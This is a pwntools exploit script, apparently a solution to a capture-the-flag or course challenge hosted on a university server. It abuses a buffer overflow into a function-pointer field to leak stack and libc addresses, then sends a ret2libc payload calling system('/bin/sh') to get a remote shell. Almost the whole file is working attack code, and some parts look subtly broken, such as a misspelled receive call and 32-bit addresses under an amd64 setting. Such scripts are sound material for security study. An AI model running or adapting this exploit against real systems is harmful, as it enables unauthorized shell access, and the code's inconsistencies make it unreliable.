#!/usr/bin/env python3

from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.terminal = ["tmux", "new-window"]

exe = ELF("./bin_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


# struct uinfo {
    # char name[32];
    # char desc[128];
    # unsigned int sfunc;
# }user;


# struct item {
    # char name[32];
    # char price[10];
# }aitem;



def setup_acc(proc, name, descr):
    proc.sendline(b"1")
    proc.send(name.ljust(32, b"A") + descr)

def reset_acc(proc):
    proc.sendline(b"1")
    setup_acc(proc, b"\x00"*32, b"\x00"*128)

def make_listing(proc, name, price):
    reset_acc(proc)
    proc.sendline(b"2")
    proc.send(name.ljust(32, b"\x00") + price.ljust(9, b"\x00"))

def print_listing(proc):
    reset_acc(proc)
    setup_acc(proc, b"\x00"*32, (b"A"*(128 - 6) + b"\x9d").ljust(128, b"\x00")) # 32 + 6
    proc.sendline(b"3")

def makeNote(proc, payload):
    reset_acc(proc)
    setup_acc(proc, b"\x00"*32, (b"A"*(128 - 6) + p16(0x864)).ljust(128, b"\x00")) # 32 + 6
    proc.sendline(b"3")
    proc.sendline(payload)

def writeWrap(proc, pointer):
    reset_acc(proc)
    setup_acc(proc, p32(pointer).ljust(32, b"\x00"), (b"G"*(128 - 10) + p16(0x836)).ljust(128, b"\x00"))
    proc.sendline(b"3")

def printName(proc):
    reset_acc(proc)
    setup_acc(proc, b"V"*32, (b"A"*(128 - 38) + p16(0xa99)).ljust(128, b"\x00")) # 32 + 6
    proc.sendline(b"3")


def main():
    cond = True
    while cond:
        try:
            # r = conn()
            # r = process([exe.path])
            r = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10156)

            sMakeNote = 0x864
            sWriteWrap = 0x836
            sPrintListing = 0x89d
            sPrintName = 0xa99

            printName(r)

            r.recvuntil(b"VV")
            r.recvuntil(b"\n")
            output = r.recvuntil(b"\n")[:-1]
            leakStackAddr = int(output[-4:][::-1].hex(),16)
            print(output)
            print(hex(leakStackAddr))


# 3f:00fc│+0e4 0xffeca7fc —▸ 0xf7dec647 (__libc_start_main+247) ◂— add esp, 0x10
# 40:0100│+0e8 0xffeca800 ◂— 1

            sStackAddr = 0xffeca800
            sStackLibc = 0xffeca7fc
            offset = sStackLibc - sStackAddr
            leakStackLibc = leakStackAddr + offset
            print(hex(leakStackLibc))

            print(b"BLALBA")
            writeWrap(r, leakStackLibc)
            print(b"AAAAAA")





            # r.recvuntil(b"Enter Choice: Enter your name: Enter your description: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter Choice: Enter your name: Enter your description: Enter Choice: ")
            r.recvuntilb(b" G")
            leakLibc_startMain = int((b"G" + r.recvuntil(b"En")[:-6])[::-1].hex(),16)
            print("Libc value: ", hex(leakLibc_startMain))

            sLeakLibc_startMain = 0xf7de7647
            sBaseLibc =           0xf7dcf000
            offsetBaseLibc = sBaseLibc - sLeakLibc_startMain

            offset_system = 0x3a950
            offset_binsh = 0x15910b

            leakBaseLibc = leakLibc_startMain + offsetBaseLibc

            leakSystem = leakBaseLibc + offset_system
            leakBinSh = offset_binsh + leakBaseLibc

            sNotes =  0xffc31628
            sEip =    0xffc3165c
            offsetEip = sEip - sNotes

            print("Leak System", hex(leakSystem) ,"\n Leaked Binsh", hex(leakBinSh))
            makeNote(r, b"A"*offsetEip + p32(leakSystem) + b"AAAA" + p32(leakBinSh) + b"\x00")
            r.interactive()
            exit()

        except EOFError:
            r.close()
            continue


if __name__ == "__main__":
    main()
